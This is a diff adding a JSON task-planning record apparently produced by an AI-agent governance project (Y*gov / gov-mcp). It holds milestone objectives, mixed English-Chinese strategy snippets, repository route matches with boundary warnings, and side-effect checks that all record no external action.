+      "## \ud83c\udfaf Mission Accomplished"
+    ],
+    "cieu_closure_expectation": "record local proof, failures, route decision, owner approval boundary, and next projection",
+    "company_objective": "prove governed agent action is understandable and locally demonstrable without external claims",
+    "governance_gate_needed": true,
+    "m_triangle_alignment": "value production before claim expansion; learning must close through CIEU/CZL",
+    "milestone_objective": "E46B canonical spine turns prior runtime/projection/brain/capability assets into one task-time flow",
+    "no_external_action": true,
+    "projection_maturity": "partial_adapter",
+    "residual_learning_expectation": "doctor/server-client gaps become residual learning candidates, not canonical learning until reviewed",
+    "session_objective": "produce local dry-run route decision with no external side effects",
+    "source_snippets": {
+      "DIRECTIVE_TRACKER": [
+        "| 1 | Enterprise customer research | CSO | \u2705 \u5b8c\u6210 | sales/enterprise_prospects_0.48.0.md (10.8KB) |",
+        "| 2 | Phase 2 OmissionEngine | CTO | \u2705 7/7 | \u540c\u4e0a |",
+        "| #009 CFO OmissionEngine | 2026-03-27 | 3/3 |",
+        "## \ud83c\udfaf Mission Accomplished",
+        "- Omission DB: **600 violations** (117 HARD_OVERDUE obligations)",
+        "Accenture/Deloitte/PwC partnerships\uff08revenue model\u5f85pilot\u8c08\u5224\u786e\u5b9a\uff09",
+        "- **Omission DB violations: 600** (117 HARD_OVERDUE obligations)",
+        "- **Top violation:** required_acknowledgement_omission (2,038)"
+      ],
+      "M_TRIANGLE": [
+        "# M Triangle \u2014 Y* Bridge Labs \u7684\u6839\u672c\u76ee\u6807 (v1)",
+        "**\u4f4d\u7f6e**: `knowledge/ceo/wisdom/M_TRIANGLE.md`",
+        "Survivability Governability Value",
+        "### M-3 Value Production (\u4ef7\u503c\u4ea7\u51fa)",
+        "- S-3.5 **dogfood \u662f\u9500\u552e\u8bc1\u636e**: Y\\* Bridge Labs \u6bcf\u4e00\u4e2a CIEU event, \u6bcf\u4e00\u4e2a agent ship, \u6bcf\u4e00\u6b21 Board catch \u2014 \u90fd\u80fd\u53d8\u6210 \"AI agent company operating real\" \u7684 case study. dogfood \u4e0d\u662f\u5185\u90e8\u73a9, \u662f**\u9500\u552e pitch \u7684\u6838\u5fc3\u5f39\u836f**.",
+        "\u6211\u4eec\u901a\u8fc7 **Survivability + Governability + Value** \u4e09\u89d2\u4fdd\u6301\u540c\u65f6\u524d\u8fdb.",
+        "\u6bcf\u4e00\u6b21 GitHub star / \u5ba2\u6237\u4e0b\u8f7d / \u4ed8\u8d39\u90fd\u662f Value \u5728\u79ef\u7d2f."
+      ],
+      "OPERATIONS": [
+        "| W4 | Series 4 | \u5468\u4e8c 08:30 ET | omission detection |",
+        "The central challenge was simple but unforgiving: Could a company operated by AI agents use its own governance product to prevent chaos? The answer arrived in the form of a Windows Git Bash error that blocked all governed sessions. The CTO ",
+        "But fixing code was the smaller revelation. The larger one came when the Board noticed the agents executing lower-priority tasks while a P0 blocker sat open. The governance framework's OmissionEngine could enforce deadlines but not dependen",
+        "Then came the SLA redesign. Human organizations measure response time in hours or days. But AI agents operate at millisecond-to-minute scales. A one-hour P0 window allows thousands of ungoverned decisions to accumulate. The Board rewrote th",
+        "All of this happened under audit. Every command, every file read, every decision is now sealed in the CIEU database with SHA-256 hash chains. When the first enterprise customer asks \"Can you prove your agents didn't access restricted data?\"",
+        "The company runs at roughly $52 per day\u2014API costs and a Claude Max subscription, plus two USPTO provisional patents filed as insurance. Projected monthly burn: $1,550. Revenue: $0. Users: 0. But the product works on itself, which means it w",
+        "- **Revenue:** $0",
+        "Today's autonomous cycle focused on closing the gap. The CEO upgraded the local installation to v0.48.0, verified CIEU hook liveness (Directive #024), collected metrics across GitHub/PyPI, wrote a complete Show HN submission draft, updated "
+      ],
+      "WORK_METHODOLOGY": [
+        "Purpose: Enable every agent (CEO \u81ea\u5df1 + \u5168\u56e2\u961f) \u5728\u6bcf\u6b21 task / spec / ruling / impl / commit \u4e4b\u524d\u81ea\u52a8\u8dd1\u8fc7\u8fd9 14 \u6761 checklist; \u540c\u65f6\u8ba9 Samantha AMENDMENT-024 \u628a\u672c\u6587\u4ef6\u52a0\u5165 CLAUDE.md + AGENTS.md \u5fc5\u8bfb\u5f15\u7528; \u540c\u65f6\u8ba9 forget_guard \u52a0 rule work_methodology_violation \u68c0\u6d4b\u5173\u952e\u8fdd\u53cd.",
+        "**\u5f3a\u5236\u7ea7\u522b**: Constitutional \u2014 \u6240\u6709 agent boot \u5fc5\u8bfb, \u6240\u6709 task \u5fc5\u8fc7\u6b64 checklist",
+        "**\u65b9\u6cd5\u8bba = \u8ba9 M Triangle \u4e0d\u5728 plan \u548c action \u4e4b\u95f4\u65ad\u94fe\u7684 structural discipline. \u4e0d\u8d70\u5b8c\u8fd9 14 \u6761\u7684 task \u4e0d\u7b97 done, \u54ea\u6015 document \u5199\u4e86\u5f88\u591a.**",
+        "## 2. \u6bcf task \u524d checklist (15 \u79d2\u8fc7\u4e00\u904d)",
+        "\u4efb\u4f55 agent \u4efb\u4f55 task \u5f00\u5de5\u524d, \u8fc7\u8fd9\u4e2a 8 \u95ee checklist (\u4ece 14 \u6761\u539f\u5219\u63d0\u70bc):"
+      ]
+    },
+    "task_id": "e46b_first_value_demo",
+    "task_objective": "Prepare the fastest credible path toward one real external user successfully installing, understanding, and valuing Y*gov / gov-mcp / Y*Bridge Labs agent-company runtime.",
+    "y_star_candidate": "Governed Agent Action Proof Packet over gov-mcp + Y-star-gov substrate"
+  },
+  "route_decision": {
+    "first_external_attempt_now": false,
+    "next_recommended_milestone": "E47_gov_mcp_server_client_demo_closure",
+    "reason": "Canonical spine keeps the proof packet route but requires server/client and doctor closure before outreach.",
+    "selected_value_object": "Governed Agent Action Proof Packet",
+    "technical_substrate": "gov-mcp + Y-star-gov governed execution"
+  },
+  "route_matches": [
+    {
+      "boundary_warning": "Future execution/tool/send action belongs behind gov-mcp and owner approval; do not build a Labs execution layer.",
+      "owner_layer": "gov_mcp_execution_boundary",
+      "recommended_action": "blocked_by_boundary",
+      "relevance_reason": "matched ['company', 'gov', 'mcp', 'runtime'] via deterministic tags/path/keywords",
+      "relevance_score": 46,
+      "repo": "gov-mcp",
+      "resource_id": "e42_gov_mcp_8d5f186dd4a3",
+      "resource_path": "gov_mcp/company_runtime_tools.py",
+      "reuse_mode": "do_not_modify",
+      "tests_to_run": [
+        "tests/test_company_runtime_tools.py"
+      ]
+    },
+    {
+      "boundary_warning": "Y-star-gov owns governance semantics; bridge-labs may reference but must not rebuild or modify in this milestone.",
+      "owner_layer": "ystar_gov_governance_kernel",
+      "recommended_action": "read_existing",
+      "relevance_reason": "matched ['company', 'runtime', 'spine'] via deterministic tags/path/keywords",
+      "relevance_score": 38,
+      "repo": "Y-star-gov",
+      "resource_id": "e42_Y_star_gov_5855a89f953b",
+      "resource_path": "tests/domains/company_runtime/test_e1_1_mission_spine_policy.py",
+      "reuse_mode": "do_not_modify",
+      "tests_to_run": [
+        "tests/domains/company_runtime/test_e1_1_mission_spine_policy.py"
+      ]
+    },
+    {
+      "boundary_warning": "Y-star-gov owns governance semantics; bridge-labs may reference but must not rebuild or modify in this milestone.",
+      "owner_layer": "ystar_gov_governance_kernel",
+      "recommended_action": "read_existing",
+      "relevance_reason": "matched ['check', 'company', 'runtime'] via deterministic tags/path/keywords",
+      "relevance_score": 38,
+      "repo": "Y-star-gov",
+      "resource_id": "e42_Y_star_gov_3286c1f3d199",
+      "resource_path": "tests/domains/company_runtime/test_mission_permission_check.py",
+      "reuse_mode": "do_not_modify",
+      "tests_to_run": [
+        "tests/domains/company_runtime/test_mission_permission_check.py"
+      ]
+    },
+    {
+      "boundary_warning": "bridge-labs strategy/runtime resource; extend rather than rebuild when possible.",
+      "owner_layer": "bridge_labs_strategy",
+      "recommended_action": "call_existing",
+      "relevance_reason": "matched ['bridge', 'execution', 'gov', 'mcp'] via deterministic tags/path/keywords",
+      "relevance_score": 38,
+      "repo": "ystar-bridge-labs",
+      "resource_id": "e42_ystar_bridge_labs_9b729c61556e",
+      "resource_path": "office/mission_command/c1_gov_mcp_execution_bridge.py",
+      "reuse_mode": "direct_call",
+      "tests_to_run": []
+    },
+    {
+      "boundary_warning": "Use existing CEO brain/KG/daily memory conventions; do not create a second brain.",
+      "owner_layer": "bridge_labs_strategy",
+      "recommended_action": "call_existing",
+      "relevance_reason": "matched ['boundary', 'execution', 'gov', 'mcp'] via deterministic tags/path/keywords",
+      "relevance_score": 38,
+      "repo": "ystar-bridge-labs",
+      "resource_id": "e42_ystar_bridge_labs_fabf45331b61",
+      "resource_path": "office/mission_command/e36_gov_mcp_execution_boundary_alignment.py",
+      "reuse_mode": "direct_call",
+      "tests_to_run": []
+    },
+    {
+      "boundary_warning": "bridge-labs strategy/runtime resource; extend rather than rebuild when possible.",
+      "owner_layer": "bridge_labs_strategy",
+      "recommended_action": "read_existing",
+      "relevance_reason": "matched ['boundary', 'execution', 'gov', 'mcp'] via deterministic tags/path/keywords",
+      "relevance_score": 38,
+      "repo": "ystar-bridge-labs",
+      "resource_id": "e42_ystar_bridge_labs_ad4c94814206",
+      "resource_path": "reports/integration/e36_gov_mcp_execution_boundary_alignment.md",
+      "reuse_mode": "use_as_report_context",
+      "tests_to_run": []
+    },
+    {
+      "boundary_warning": "Y-star-gov owns governance semantics; bridge-labs may reference but must not rebuild or modify in this milestone.",
+      "owner_layer": "ystar_gov_governance_kernel",
+      "recommended_action": "read_existing",
+      "relevance_reason": "matched ['bridge', 'path'] via deterministic tags/path/keywords",
+      "relevance_score": 30,
+      "repo": "Y-star-gov",
+      "resource_id": "e42_Y_star_gov_cf80f71a7503",
+      "resource_path": "tests/demo_rle_path_a_bridge.py",
+      "reuse_mode": "do_not_modify",
+      "tests_to_run": [
+        "tests/demo_rle_path_a_bridge.py"
+      ]
+    },
+    {
+      "boundary_warning": "Y-star-gov owns governance semantics; bridge-labs may reference but must not rebuild or modify in this milestone.",
+      "owner_layer": "ystar_gov_governance_kernel",
+      "recommended_action": "read_existing",
+      "relevance_reason": "matched ['company', 'runtime'] via deterministic tags/path/keywords",
+      "relevance_score": 30,
+      "repo": "Y-star-gov",
+      "resource_id": "e42_Y_star_gov_2e7f513deb85",
+      "resource_path": "tests/domains/company_runtime/test_admin_rationalization.py",
+      "reuse_mode": "do_not_modify",
+      "tests_to_run": [
+        "tests/domains/company_runtime/test_admin_rationalization.py"
+      ]
+    }
+  ],
+  "side_effect_postcheck": {
+    "customer_contact": false,
+    "expert_contact": false,
+    "form_submission": false,
+    "human_identification": false,
+    "internet_install": false,
+    "login": false,
+    "payment": false,
+    "provider_api_execution": false,
+    "publish": false,
+    "scraping": false,
+    "secret_use": false,
+    "send": false
+  },
+  "side_effect_precheck": {
+    "customer_contact": false,
+    "expert_contact": false,
+    "form_submission": false,
+    "human_identification": false,
+    "internet_install": false,
+    "login": false,
+    "payment": false,
+    "provider_api_execution": false,
+    "publish": false,
+    "scraping": false,
+    "secret_use": false,
+    "send": false
+  },
+  "side_effect_report": {
+    "customer_contact": false,
+    "expert_contact": false,
+    "form_submission": false,
+    "human_identification": false,
+    "internet_install": false,
+    "login": false,
+    "payment": false,
+    "provider_api_execution": false,
+    "publish": false,
+    "scraping": false,
+    "secret_use": false,
+    "send": false
+  },
+  "task_id": "e46b_first_value_demo"
+}
